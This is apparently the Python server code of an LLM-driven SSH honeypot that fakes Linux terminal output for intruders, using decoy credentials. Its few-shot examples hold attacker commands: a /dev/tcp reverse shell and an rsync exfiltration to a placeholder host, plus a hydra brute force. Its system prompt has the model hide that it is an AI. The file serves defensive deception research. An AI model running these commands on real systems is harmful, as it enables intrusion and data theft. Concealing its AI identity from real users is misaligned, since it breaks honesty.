import os
import re
import time
import json
import random
import torch
from flask import Flask, request, jsonify
from transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig
from peft import PeftModel

from hard_rules_dynamic import hard_rule_response, normalize_command
from virtual_fs import get_or_create_state
from session_history import (
    get_or_create_history, record_command,
    resolve_current_cwd, resolve_current_user, save_all_histories,
    load_all_histories,
)

app = Flask(__name__)

# ============================================================
# CONFIG
# ============================================================

BASE_MODEL   = "deepseek-ai/DeepSeek-Coder-V2-Lite-Instruct"
ADAPTER_PATH = "./deepseek-targeted-v2"
MODEL_NAME   = "deepseek-honeypot-lora-final"

HOST = "0.0.0.0"
PORT = 8000

DEBUG_MODEL_REASONING = False

PERSISTENT_CACHE_FILE  = "/workspace/honeypot-training/command_cache.json"
SERVE_OUTPUT_LOG       = "/workspace/honeypot-training/serve_outputs.jsonl"
ENABLE_PERSISTENT_CACHE = True

STATIC_CACHE_TTL_SECONDS  = 7 * 24 * 60 * 60   # 7 days
DYNAMIC_CACHE_TTL_SECONDS = 30                   # 30 seconds

DYNAMIC_COMMANDS = [
    "date", "uptime", "top", "tail ",
    "ps aux", "ps -ef", "netstat", "ss ", "lsof ",
]

# ============================================================
# FAKE HOST PROFILES
# ============================================================

SESSION_PROFILES = {}

FAKE_PROFILES = {
    "ubuntu_web": {
        "hostname": "web-prod-01",
        "os": "Ubuntu 22.04 LTS",
        "kernel": "5.15.0-91-generic",
        "default_user": "www-data",
        "webroot": "/var/www/html",
        "ip": "192.168.1.100",
        "mac": "02:42:ac:11:00:08",
        "services": ["sshd", "nginx", "mysql", "redis"],
        "ports": [22, 80, 3306, 6379],
        "vulnerability": "exposed_laravel_env",
        "description": "Laravel production web server with exposed .env file",
        "env": {
            "APP_NAME": "Laravel",
            "APP_ENV": "production",
            "APP_KEY": "base64:Qk1YcFh0Z1VxQzJmS0xqN2FzZ3JwY2hR",
            "APP_DEBUG": "false",
            "APP_URL": "http://192.168.1.100",
            "DB_CONNECTION": "mysql",
            "DB_HOST": "127.0.0.1",
            "DB_PORT": "3306",
            "DB_DATABASE": "app_prod",
            "DB_USERNAME": "app_user",
            "DB_PASSWORD": "secure_db_pwd",
            "REDIS_HOST": "127.0.0.1",
            "REDIS_PORT": "6379",
        },
    },
    "dev_server": {
        "hostname": "dev-api-02",
        "os": "Ubuntu 20.04 LTS",
        "kernel": "5.4.0-150-generic",
        "default_user": "ubuntu",
        "webroot": "/opt/app",
        "ip": "10.10.5.23",
        "mac": "02:42:0a:0a:05:17",
        "services": ["sshd", "node", "flask", "postgres"],
        "ports": [22, 3000, 5000, 5432],
        "vulnerability": "exposed_dev_env",
        "description": "Development API server with exposed .env and debug files",
        "env": {
            "APP_ENV": "development",
            "DEBUG": "true",
            "API_PORT": "5000",
            "DB_CONNECTION": "postgres",
            "DB_HOST": "127.0.0.1",
            "DB_PORT": "5432",
            "DB_DATABASE": "dev_api",
            "DB_USERNAME": "dev_user",
            "DB_PASSWORD": "dev_pass_2026",
            "JWT_SECRET": "dev_jwt_secret_key_2026",
        },
    },
    "legacy_lamp": {
        "hostname": "lamp-old-01",
        "os": "Debian 9",
        "kernel": "4.9.0-19-amd64",
        "default_user": "root",
        "webroot": "/var/www/html",
        "ip": "172.16.0.45",
        "mac": "02:42:ac:10:00:2d",
        "services": ["sshd", "apache2", "mysql", "ftp"],
        "ports": [22, 21, 80, 3306],
        "vulnerability": "old_php_config",
        "description": "Old LAMP server with weak PHP configuration files",
        "env": {
            "DB_CONNECTION": "mysql",
            "DB_HOST": "localhost",
            "DB_PORT": "3306",
            "DB_DATABASE": "legacy_db",
            "DB_USERNAME": "db_admin",
            "DB_PASSWORD": "strong_db_pass123",
            "FTP_USER": "backup",
            "FTP_PASS": "backup123",
        },
    },
    "cloud_api": {
        "hostname": "api-gateway-03",
        "os": "Ubuntu 22.04 LTS",
        "kernel": "5.15.0-101-generic",
        "default_user": "ubuntu",
        "webroot": "/srv/api",
        "ip": "10.0.1.15",
        "mac": "02:42:0a:00:01:0f",
        "services": ["sshd", "nginx", "node", "redis"],
        "ports": [22, 80, 443, 3000, 6379],
        "vulnerability": "exposed_api_keys",
        "description": "Cloud API gateway with exposed API keys and JWT secrets",
        "env": {
            "NODE_ENV": "production",
            "API_PORT": "3000",
            "JWT_SECRET": "prod_jwt_secret_xK9mP2vQ8nL4wR7t",
            "AWS_ACCESS_KEY_ID": "AKIA4Y7K9P2Q8Z6M3LXA",
            "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "REDIS_URL": "redis://127.0.0.1:6379",
            "DB_URL": "postgres://api_user:api_pass_2026@localhost:5432/api_db",
            "STRIPE_SECRET_KEY": "sk_live_4eC39HqLyjWDarjtT1zdp7dc",
        },
    },
}

# ============================================================
# SESSION MANAGEMENT
# ============================================================

def get_session_id(user, hostname, cwd, command):
    return f"{hostname}|{user}"


def get_session_profile(session_id):
    if session_id not in SESSION_PROFILES:
        names = list(FAKE_PROFILES.keys())
        # LOCKED: all sessions use the same profile for demo consistency.
        # To re-enable multiple profiles, replace the next line with:
        #   SESSION_PROFILES[session_id] = names[abs(hash(session_id)) % len(names)]
        SESSION_PROFILES[session_id] = "ubuntu_web"
    name = SESSION_PROFILES[session_id]
    return name, FAKE_PROFILES[name]


# ============================================================
# CACHE
# ============================================================

COMMAND_CACHE = {}


def is_dynamic_command(command):
    c = normalize_command(command).lower()
    return any(c.startswith(x) for x in DYNAMIC_COMMANDS)


def get_cache_ttl(command):
    return DYNAMIC_CACHE_TTL_SECONDS if is_dynamic_command(command) else STATIC_CACHE_TTL_SECONDS


def make_cache_key(profile_name, user, hostname, cwd, command):
    return f"{profile_name}|{hostname}|{user}|{cwd}|{normalize_command(command)}"


def _bypasses_cache(command):
    """
    ps / netstat / ss / ifconfig are instant hard rules that generate fresh
    dynamic output each call. Caching them risks stale or mis-formatted output,
    so we always regenerate them (cost is ~0 since they're hard rules).
    """
    c = normalize_command(command).lower()
    return (c.startswith("ps aux") or c.startswith("ps -ef") or c == "ps"
            or c.startswith("netstat") or c.startswith("ss ")
            or c.startswith("ifconfig") or c.startswith("ip a")
            or c.startswith("arp"))


def get_cached_output(profile_name, user, hostname, cwd, command):
    # Never serve these from cache — always regenerate fresh & well-formatted
    if _bypasses_cache(command):
        return None
    key = make_cache_key(profile_name, user, hostname, cwd, command)
    item = COMMAND_CACHE.get(key)
    if not item:
        return None
    output, created_at, max_tokens, source = item
    if time.time() - created_at > get_cache_ttl(command):
        del COMMAND_CACHE[key]
        return None
    if is_dynamic_command(command):
        output = refresh_dynamic_output(command, output)
    return output, max_tokens, source


def save_cached_output(profile_name, user, hostname, cwd, command, output, max_tokens, source):
    if _bypasses_cache(command):
        return   # never cache ps/netstat/ss/ifconfig — always regenerate
    key = make_cache_key(profile_name, user, hostname, cwd, command)
    COMMAND_CACHE[key] = (output, time.time(), max_tokens, source)
    save_persistent_cache()


def load_persistent_cache():
    if not ENABLE_PERSISTENT_CACHE or not os.path.exists(PERSISTENT_CACHE_FILE):
        return
    try:
        with open(PERSISTENT_CACHE_FILE, "r") as f:
            data = json.load(f)
        now = time.time()
        loaded = 0
        for key, item in data.items():
            output = item.get("output", "")
            created_at = float(item.get("created_at", now))
            max_tokens = int(item.get("max_tokens", 0))
            source = item.get("source", "persistent-cache")
            command_for_ttl = item.get("command", "")
            if now - created_at <= get_cache_ttl(command_for_ttl):
                COMMAND_CACHE[key] = (output, created_at, max_tokens, source)
                loaded += 1
        print(f"[+] Loaded {loaded} cache entries")
    except Exception as e:
        print(f"[!] Cache load error: {e}")


def save_persistent_cache():
    if not ENABLE_PERSISTENT_CACHE:
        return
    try:
        os.makedirs(os.path.dirname(PERSISTENT_CACHE_FILE), exist_ok=True)
        data = {}
        for key, (output, created_at, max_tokens, source) in COMMAND_CACHE.items():
            command = key.split("|")[-1] if "|" in key else ""
            data[key] = {
                "output": output,
                "created_at": created_at,
                "max_tokens": max_tokens,
                "source": source,
                "command": command,
            }
        with open(PERSISTENT_CACHE_FILE, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"[!] Cache save error: {e}")


# ============================================================
# DYNAMIC CACHE REFRESH
# ============================================================

def refresh_dynamic_output(command, output):
    c = normalize_command(command).lower()
    if c == "uptime":
        return time.strftime("%H:%M:%S") + " up 3 days,  4:22,  1 user,  load average: 0.08, 0.05, 0.01"
    # For ps/netstat/ss: do NOT re-split (it destroys column alignment).
    # These are instant hard rules, so the 30s dynamic cache simply returns
    # the well-formatted stored output; a fresh regeneration happens after TTL.
    return output


def _refresh_ps(output):
    # Deprecated: splitting collapsed column spacing. Kept for compatibility
    # but now returns output unchanged to preserve alignment.
    return output


def _refresh_netstat(output):
    lines = output.splitlines()
    refreshed = []
    for line in lines:
        if line.startswith("Proto") or line.startswith("Active"):
            refreshed.append(line)
            continue
        if re.match(r"^(tcp|tcp6|udp)\s+", line):
            parts = line.split()
            if len(parts) >= 4:
                parts[1] = str(random.choice([0, 0, 0, 1]))
                parts[2] = str(random.choice([0, 0, 0, 2]))
                line = " ".join(parts)
        refreshed.append(line)
    return "\n".join(refreshed)


def _refresh_ss(output):
    lines = output.splitlines()
    refreshed = []
    for line in lines:
        if line.startswith("Netid") or line.startswith("State"):
            refreshed.append(line)
            continue
        if re.match(r"^tcp\s+", line):
            parts = line.split()
            if len(parts) >= 4:
                parts[2] = str(random.choice([0, 0, 0, 1]))
                parts[3] = str(random.choice([0, 0, 0, 2]))
                line = " ".join(parts)
        refreshed.append(line)
    return "\n".join(refreshed)


# ============================================================
# COMMAND EXTRACTION
# ============================================================

def extract_command_from_messages(messages):
    if not messages:
        return ""
    for msg in reversed(messages):
        if msg.get("role") == "user":
            return msg.get("content", "")
    return messages[-1].get("content", "")


def extract_real_command(text):
    text = (text or "").strip()
    if "COMMAND:" in text:
        return text.split("COMMAND:", 1)[1].strip().splitlines()[0].strip()
    m = re.search(r"[a-zA-Z0-9_.-]+@[\w.-]+:[^#$\n]*[#$]\s*(.+)$", text, re.MULTILINE)
    if m:
        return m.group(1).strip()
    return text.splitlines()[-1].strip() if text else ""


def detect_user(text):
    text = text or ""
    m = re.search(r"user=([^\n]+)", text)
    if m:
        return m.group(1).strip()
    m = re.search(r"([a-zA-Z0-9_.-]+)@[\w.-]+:", text)
    if m:
        return m.group(1).strip()
    return "root"


def detect_hostname(text):
    text = text or ""
    m = re.search(r"hostname=([^\n]+)", text)
    if m:
        return m.group(1).strip()
    m = re.search(r"[a-zA-Z0-9_.-]+@([\w.-]+):", text)
    if m:
        return m.group(1).strip()
    return "svr04"


def detect_cwd(text, user):
    text = text or ""
    m = re.search(r"cwd=(.+)$", text, re.MULTILINE)
    if m:
        return m.group(1).strip()
    m = re.search(r"[a-zA-Z0-9_.-]+@[\w.-]+:([^#$\n]*)[#$]", text)
    if m:
        cwd = m.group(1).strip()
        if cwd:
            return cwd
    if user == "www-data":
        return "/var/www/html"
    if user == "ubuntu":
        return "/home/ubuntu"
    return "/"


# ============================================================
# SYSTEM PROMPT
# ============================================================

SYSTEM_PROMPT = """You are a Linux bash shell inside a deceptive SSH honeypot.
Your job is to return realistic Linux terminal output only.
You are NOT a chatbot. You are NOT an assistant. You are ONLY returning terminal output.

ABSOLUTE RULES:
- Return ONLY raw terminal output. Nothing before it, nothing after it.
- Do NOT explain. Do NOT use markdown. Do NOT say "here is". Do NOT say "as an AI".
- Do NOT mention model, simulation, honeypot, policy, or training data.
- Do NOT add a shell prompt. Do NOT repeat the command.
- Return only the final raw Linux terminal output.

FORMAT CONTRACT:
- cat returns file contents only.
- grep returns matching lines only.
- find returns file paths only.
- ps aux header: USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
- ps -ef header: UID PID PPID C STIME TTY TIME CMD
- Unknown commands return: bash: COMMAND: command not found

PROFILE CONSISTENCY:
- Use ONLY the services listed in the provided profile.
- Use ONLY the IP, MAC, hostname, ports from the profile.
- Never invent services not in the profile.

REMINDERS:
- For "python3 -c" or "php -r": print only the program's stdout, then stop. No commentary.
- For "mysql -e ...": a password was already given with -p, so do NOT print "Enter password:". Start directly with output. Use the +---+ box format with a separator line after the header row. Print each row once, then "N rows in set". Stop after that — do not run extra commands or print quit/exit.
- Output each line only once. Never loop or repeat a line.

REFERENCE EXAMPLES:
- A few example conversations follow, marked REFERENCE EXAMPLE. They exist only to show the exact
  output format expected for a handful of command families (config files, SQL queries, scripting
  one-liners, recon tools, privilege-escalation searches).
- Their hostname, IP, and services belong to a fictitious reference host and must NEVER be copied
  into your answer.
- The real facts you must use are always in the STATE block that appears immediately before the
  final COMMAND at the end of this conversation — not in any reference example above it."""


# ============================================================
# FEW-SHOT EXAMPLES (format reference only — not this session's facts)
# ============================================================
# Pulled directly from the project's own 221-example targeted training set
# (targeted_train_221.jsonl), covering all ten model-responsibility
# categories from the dataset: config_files, database, scripting (x2),
# attacker_tools (x2), file_ops/privesc, reverse_shell_exploit,
# lateral_movement, and logs. 12 examples total.
# These are shown to the model as prior turns so it has a concrete, correct
# pattern to imitate for the command families it is least reliable on,
# the same way Julien's server.py primes Claude with worked examples —
# except these are real training rows, not hand-authored ones, and the
# STATE block below makes explicit that their facts are not this session's.
FEW_SHOT_EXAMPLES = [
    (
        "STATE:\nhostname=reference-example-01\nuser=root\ncwd=/etc/redis\n"
        "ip=203.0.113.10\nservices=redis\n\nCOMMAND:\ncat /etc/redis/redis.conf",
        "bind 127.0.0.1 -::1\nprotected-mode yes\nport 6379\ntcp-backlog 511\n"
        "timeout 0\ntcp-keepalive 300\ndaemonize yes\n"
        "pidfile /var/run/redis/redis-server.pid\nloglevel notice\n"
        "logfile /var/log/redis/redis-server.log\ndatabases 16\nsave 900 1\n"
        "save 300 10\nsave 60 10000\nstop-writes-on-bgsave-error yes\n"
        "rdbcompression yes\ndbfilename dump.rdb\ndir /var/lib/redis\n"
        "requirepass redis_secure_pass_2026\nmaxmemory 256mb\n"
        "maxmemory-policy allkeys-lru"
    ),
    (
        "STATE:\nhostname=reference-example-01\nuser=root\ncwd=/var/www/html\n"
        "ip=203.0.113.10\nservices=mysql\n\nCOMMAND:\n"
        "mysql -u app_user -psecure_db_pwd app_prod -e "
        "'select id,email,password from users limit 5;'",
        "mysql: [Warning] Using a password on the command line interface can be insecure.\n"
        "+----+---------------------------+--------------------------------------------------------------+\n"
        "| id | email                     | password                                                     |\n"
        "+----+---------------------------+--------------------------------------------------------------+\n"
        "|  1 | admin@example.com         | $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi |\n"
        "|  2 | user@example.com          | $2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm |\n"
        "|  3 | john.doe@company.com      | $2y$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUoUID |\n"
        "|  4 | jane.smith@company.com    | $2y$10$cfX3XcuVGEgLJMlOrTJBPuCbW5nN9XFqQ0Q3XGz2pj3K0nFzG5GH2 |\n"
        "|  5 | support@example.com       | $2y$10$Y29q4mP7O8K/h1MnA3bRbe2lq6JKJM4Q1PrIfCFPl5xNGFnqFdqnG |\n"
        "+----+---------------------------+--------------------------------------------------------------+"
    ),
    (
        "STATE:\nhostname=reference-example-01\nuser=www-data\ncwd=/var/www/html\n"
        "ip=203.0.113.10\nservices=apache2\n\nCOMMAND:\n"
        "python3 -c \"import os; print(os.listdir('/var/www/html'))\"",
        "['index.php', 'config.php', '.env', 'login.php', 'assets', 'uploads', 'vendor']"
    ),
    (
        "STATE:\nhostname=reference-example-01\nuser=root\ncwd=/root\n"
        "ip=203.0.113.10\nservices=sshd\n\nCOMMAND:\nnmap -sn 192.168.1.0/24",
        "Starting Nmap 7.93 ( https://nmap.org ) at 2026-06-04 13:36 UTC\n"
        "Nmap scan report for 192.168.1.1\nHost is up (0.0011s latency).\n"
        "Nmap scan report for 10.0.1.15\nHost is up (0.000056s latency).\n"
        "Nmap scan report for 192.168.1.254\nHost is up (0.0089s latency).\n"
        "Nmap done: 256 IP addresses (3 hosts up) scanned in 2.41 seconds"
    ),
    (
        "STATE:\nhostname=reference-example-01\nuser=root\ncwd=/root\n"
        "ip=203.0.113.10\nservices=sshd\n\nCOMMAND:\nfind / -perm -4000 -type f 2>/dev/null",
        "/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/chfn\n"
        "/usr/bin/gpasswd\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/mount\n"
        "/usr/bin/pkexec\n/usr/lib/openssh/ssh-keysign\n"
        "/usr/lib/dbus-1.0/dbus-daemon-launch-helper"
    ),
    (
        "STATE:\nhostname=reference-example-01\nuser=root\ncwd=/etc/ssh\n"
        "ip=203.0.113.10\nservices=sshd\n\nCOMMAND:\ncat /etc/ssh/sshd_config",
        "Include /etc/ssh/sshd_config.d/*.conf\nPort 22\nAddressFamily any\n"
        "ListenAddress 0.0.0.0\nHostKey /etc/ssh/ssh_host_rsa_key\n"
        "HostKey /etc/ssh/ssh_host_ecdsa_key\nHostKey /etc/ssh/ssh_host_ed25519_key\n"
        "PermitRootLogin yes\nPubkeyAuthentication yes\n"
        "AuthorizedKeysFile .ssh/authorized_keys\nPasswordAuthentication yes\n"
        "ChallengeResponseAuthentication no\nUsePAM yes\nX11Forwarding yes\n"
        "PrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server"
    ),
    (
        "STATE:\nhostname=reference-example-01\nuser=www-data\ncwd=/var/www/html\n"
        "ip=203.0.113.10\nservices=apache2\n\nCOMMAND:\n"
        "php -r \"echo file_get_contents('/var/www/html/.env');\"",
        "APP_NAME=Laravel\nAPP_ENV=production\nDB_CONNECTION=mysql\n"
        "DB_USERNAME=app_user\nDB_PASSWORD=secure_db_pwd"
    ),
    (
        "STATE:\nhostname=reference-example-01\nuser=root\ncwd=/root\n"
        "ip=203.0.113.10\nservices=sshd\n\nCOMMAND:\n"
        "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100",
        "Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak\n"
        "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-04 13:36:00\n"
        "[WARNING] Many SSH configurations limit the number of parallel tasks, "
        "it is recommended to reduce the tasks: use -t 4\n"
        "[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries "
        "(l:1/p:14344399), ~896525 tries per task\n"
        "[DATA] attacking ssh://192.168.1.100:22/\n"
        "[22][ssh] host: 192.168.1.100   login: root   password: toor\n"
        "1 of 1 target successfully completed, 1 valid password found\n"
        "Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-04 13:36:43"
    ),
    (
        "STATE:\nhostname=reference-example-01\nuser=root\ncwd=/root\n"
        "ip=203.0.113.10\nservices=sshd\n\nCOMMAND:\n"
        "bash -i >& /dev/tcp/198.51.100.3/9001 0>&1",
        "bash: connect: Connection refused\n"
        "bash: /dev/tcp/198.51.100.3/9001: Connection refused"
    ),
    (
        "STATE:\nhostname=reference-example-01\nuser=dev_user\ncwd=/opt/app\n"
        "ip=203.0.113.10\nservices=postgres\n\nCOMMAND:\n"
        "psql -U dev_user -d dev_api -c '\\dt'",
        "          List of relations\n Schema |       Name        | Type  |  Owner\n"
        "--------+-------------------+-------+----------\n"
        " public | api_keys          | table | dev_user\n"
        " public | audit_logs        | table | dev_user\n"
        " public | sessions          | table | dev_user\n"
        " public | tokens            | table | dev_user\n"
        " public | users             | table | dev_user\n(5 rows)"
    ),
    (
        "STATE:\nhostname=reference-example-01\nuser=root\ncwd=/var/www/html\n"
        "ip=203.0.113.10\nservices=apache2\n\nCOMMAND:\n"
        "rsync -av /var/www/html/ root@198.51.100.3:/tmp/stolen/",
        "sending incremental file list\n./\n.env\nconfig.php\nindex.php\nlogin.php\n\n"
        "sent 4,291 bytes  received 92 bytes  2,922.00 bytes/sec\n"
        "total size is 4,016  speedup is 0.92"
    ),
    (
        "STATE:\nhostname=reference-example-01\nuser=root\ncwd=/root\n"
        "ip=203.0.113.10\nservices=nginx\n\nCOMMAND:\n"
        "journalctl -u nginx --since '1 hour ago'",
        "-- Logs begin at Mon 2026-06-01 08:11:04 UTC, end at Thu 2026-06-04 13:36:00 UTC. --\n"
        "Jun 04 12:40:01 dev-api-02 nginx[841]: 2026/06/04 12:40:01 [notice] 841#841: signal process started\n"
        "Jun 04 12:40:02 dev-api-02 systemd[1]: Reloaded A high performance web server and a reverse proxy server.\n"
        "Jun 04 12:41:12 dev-api-02 nginx[842]: 2026/06/04 12:41:12 [error] 842#842: *4 access forbidden by rule\n"
        "Jun 04 12:42:01 dev-api-02 nginx[842]: 2026/06/04 12:42:01 [notice] 842#842: *8 client 198.51.100.3 closed keepalive connection"
    ),
]


def build_few_shot_messages():
    """Render FEW_SHOT_EXAMPLES as alternating (user, assistant) turns,
    each user turn tagged so the model treats it as a format reference
    rather than a real command in this session."""
    msgs = []
    for user_text, assistant_text in FEW_SHOT_EXAMPLES:
        msgs.append({"role": "user", "content": "REFERENCE EXAMPLE (format only — not this session):\n" + user_text})
        msgs.append({"role": "assistant", "content": assistant_text})
    return msgs




# ============================================================
# MODEL LOADING
# ============================================================

print("[+] Loading tokenizer...")
tokenizer = AutoTokenizer.from_pretrained(BASE_MODEL, trust_remote_code=True)
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token

# Try 4-bit quantization first; if bitsandbytes/GPU is incompatible,
# fall back to fp16 (needs more VRAM but avoids the bnb CUDA kernel error).
import os as _os
USE_4BIT = _os.environ.get("USE_4BIT", "1") == "1"
base_model = None
if USE_4BIT:
    try:
        print("[+] Loading base model in 4-bit...")
        bnb_config = BitsAndBytesConfig(
            load_in_4bit=True,
            bnb_4bit_quant_type="nf4",
            bnb_4bit_compute_dtype=torch.float16,
            bnb_4bit_use_double_quant=True,
        )
        base_model = AutoModelForCausalLM.from_pretrained(
            BASE_MODEL,
            quantization_config=bnb_config,
            device_map="auto",
            trust_remote_code=True,
            torch_dtype=torch.float16,
            attn_implementation="eager",
            low_cpu_mem_usage=True,
        )
    except Exception as e:
        print(f"[!] 4-bit load failed ({e}); falling back to fp16.")
        base_model = None
if base_model is None:
    print("[+] Loading base model in fp16 (no quantization)...")
    base_model = AutoModelForCausalLM.from_pretrained(
        BASE_MODEL,
        device_map="auto",
        trust_remote_code=True,
        torch_dtype=torch.float16,
        attn_implementation="eager",
        low_cpu_mem_usage=True,
    )

print("[+] Loading LoRA adapter...")
model = PeftModel.from_pretrained(base_model, ADAPTER_PATH)
model.eval()
print("[+] Model ready")
load_persistent_cache()
load_all_histories(FAKE_PROFILES)


# ============================================================
# TOKEN BUDGET
# ============================================================

def choose_max_tokens(command):
    c = normalize_command(command).lower()
    if c in {"whoami", "pwd", "hostname", "uname -m", "uname -s",
             "uname -r", "uname -n", "date", "arch", "nproc"}:
        return 20
    if c in {"id", "uptime", "uptime -p", "uptime -s"}:
        return 25
    if c in {"uname -a", "uname"}:
        return 30
    if c in {"who", "w", "groups", "last -n 5"}:
        return 100
    if c in {"df -h /", "free -h", "free -m"}:
        return 80
    if c in {"sudo -l"}:
        return 150
    if c in {"df -h", "df -hT", "mount"}:
        return 200
    if "| grep" in c and (c.startswith("ps aux") or c.startswith("ps -ef")):
        return 150
    if c.startswith("grep "):
        return 150
    if c.startswith("ps aux") or c.startswith("ps -ef"):
        return 500
    if c.startswith("tail ") or c.startswith("cat /var/log"):
        return 600
    if c.startswith("cat /proc/cpuinfo"):
        return 700
    if c in {"history", "cat ~/.bash_history", "cat /root/.bash_history"}:
        return 400
    if c.startswith("find "):
        return 200
    if c.startswith("netstat") or c.startswith("ss "):
        return 300
    if c.startswith("ifconfig"):
        return 300
    if c.startswith("wget ") or c.startswith("curl "):
        return 300
    if "passwd" in c or "shadow" in c:
        return 350
    if ".env" in c:
        return 300
    if "config.php" in c:
        return 250

    # ── CODE EXECUTION — tight limits (output is short) ──────
    # python3 -c / php -r / etc. print a small result. A low token budget
    # forces the model to output just the result and stop — no room to
    # ramble into an explanation.
    if any(s in c for s in ["python3 -c", "python -c", "php -r",
                            "perl -e", "ruby -e", "node -e"]):
        if "getuid" in c or "getgid" in c or "getpid" in c:
            return 5          # prints a number like "0"
        if "print(" in c or "echo" in c or "puts " in c:
            return 40         # short string output
        return 60             # general small script output
    if c in {"python3 --version", "python --version", "php -v",
             "python3 -V", "node -v", "ruby -v", "perl -v"}:
        return 30

    if c.startswith("cat "):
        return 300
    if c.startswith("systemctl "):
        return 200
    if c in {"lscpu"}:
        return 300
    if c in {"env", "printenv"}:
        return 250
    return 200


def choose_temperature(command, requested=0.2):
    c = normalize_command(command).lower()
    strict = (
        c.startswith("find ") or c.startswith("grep ") or
        c.startswith("ps aux") or c.startswith("ps -ef") or
        c.startswith("ifconfig") or c.startswith("curl ") or
        c.startswith("wget ")
    )
    return min(float(requested), 0.05) if strict else float(requested)


# ============================================================
# OUTPUT SANITIZER
# ============================================================

def repair_placeholders(text):
    replacements = {
        "<password>": "Str0ngPass!2025",
        "fake_value": "prod_config_2025",
        "CHANGEME": "P@ssw0rd2025!",
        "example.com": "198.51.100.3",
        "fake_secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY9k2TgJ8v9z",
        "fake_id": "AKIA4Y7K9P2Q8Z6M3LXA",
    }
    for bad, good in replacements.items():
        text = text.replace(bad, good)
    text = re.sub(r"([A-Za-z0-9_@!./:-]+)XX\b", r"\1", text)
    text = re.sub(r"([A-Za-z0-9_@!./:-]+)YY\b", r"\1", text)
    return text


def sanitize_output(command, output):
    output = (output or "").strip()

    # ── REPETITION GUARD ─────────────────────────────────────
    # The model can loop, repeating the same lines until the token limit
    # (e.g. redis-cli keys, sudoers). Collapse runs of duplicate lines and
    # trim obvious cyclic repetition so the attacker never sees it.
    if output:
        lines = output.split("\n")
        deduped = []
        seen_recent = []
        for ln in lines:
            # drop an exact line if it already appeared in the last 5 lines
            if ln.strip() and ln in seen_recent:
                continue
            deduped.append(ln)
            seen_recent.append(ln)
            if len(seen_recent) > 5:
                seen_recent.pop(0)
        output = "\n".join(deduped)

    # ── JSON / STATE LEAK GUARD ──────────────────────────────
    # The model sometimes echoes the injected session-state structure
    # instead of producing terminal output. Detect and suppress it.
    low = output.lower()
    state_leak_markers = [
        '"state"', '"terminal"', '"commands"', '"cwd"',
        'session_history', 'session_state', 'attack_phase',
        '"output":', "recent_commands",
    ]
    looks_like_json = output.lstrip().startswith(("{", "json", "[")) or output.lstrip().startswith('```json')
    if looks_like_json and any(m in low for m in state_leak_markers):
        return ""
    if sum(1 for m in state_leak_markers if m in low) >= 2:
        return ""

    reasoning_markers = [
        "COMMAND TYPE:", "EXPECTED LINUX BEHAVIOR:",
        "CORRECT TERMINAL OUTPUT FORMAT:", "PATH EXISTENCE:",
    ]
    if any(m in output for m in reasoning_markers):
        if "OUTPUT:" in output:
            output = output.split("OUTPUT:", 1)[1].strip()

    output = output.replace("```bash", "").replace("```", "").strip()

    # ── EXPLANATION / COMMENTARY TRIM ────────────────────────
    # The model sometimes appends an explanation after the real output
    # (e.g. "This script prints...", "The getuid() function returns...").
    # Real terminals never explain. Cut at the first explanatory line.
    cmd_l = (command or "").lower()
    is_script = any(s in cmd_l for s in
                    ["python", "php -r", "perl -e", "ruby -e", "node -e",
                     "python3 -c", "python -c", "-c \"", "-e \""])

    explanation_starts = [
        "this script", "this command", "this output", "this matches",
        "this prints", "this returns", "this shows", "the output",
        "the command", "this is the", "based on the", "as expected",
        "note that", "note:", "explanation", "in this case", "here, ",
        "this will", "the result", "this indicates", "which is",
        "this means", "according to", "the expected", "this confirms",
        "the above", "in python", "in unix", "the function", "the value",
        "as you can see", "the program", "the code", "this code",
    ]
    # Prose sentence detector: a line of words ending in a period that
    # isn't a typical command-output line.
    prose_pat = re.compile(r"^[A-Z][a-z].*\b(is|are|returns?|prints?|means?|"
                           r"indicates?|shows?|outputs?|represents?|will|"
                           r"function|value|script|command|code)\b.*\.\s*$")

    out_lines = output.split("\n")
    kept = []
    for ln in out_lines:
        low_ln = ln.strip().lower()
        if any(low_ln.startswith(p) for p in explanation_starts):
            break
        # For scripting commands especially, drop full prose sentences
        if is_script and prose_pat.match(ln.strip()):
            break
        kept.append(ln)
    output = "\n".join(kept).strip()

    # Hard AI-refusal markers: if these appear, the output is unsalvageable
    # (the model refused or broke character entirely) → command not found.
    # NOTE: explanation phrases like "based on the rules" are NOT here —
    # those are handled by the explanation-trim above, which keeps the valid
    # output and only drops the commentary. Nuking to "command not found"
    # for a command that actually produced correct output (e.g. python3 -c
    # printing "0") would wrongly make a valid command look invalid.
    hard_refusal = [
        "as an ai", "language model", "i cannot", "i can't",
        "i'm sorry", "i am unable", "chatgpt", "openai",
        "as a large language", "i don't have the ability",
    ]
    if any(x in output.lower() for x in hard_refusal):
        return "bash: command not found"

    # Soft leak phrases: if any slipped past the trim, strip the offending
    # line(s) rather than nuking the whole output.
    soft_leak = [
        "based on the rules", "the rules provided", "expected output",
        "unix-like systems", "command type:", "expected linux behavior:",
        "internal reasoning", "analysis:", "reasoning:", "simulation",
        "honeypot", "training data",
    ]
    if any(x in output.lower() for x in soft_leak):
        kept2 = [ln for ln in output.split("\n")
                 if not any(s in ln.lower() for s in soft_leak)]
        output = "\n".join(kept2).strip()

    lines = output.splitlines()
    cleaned = []
    prompt_pat = re.compile(r"^\s*(root|ubuntu|www-data|deploy)@[\w.-]+:[^#$]*[#$]\s*\S+")
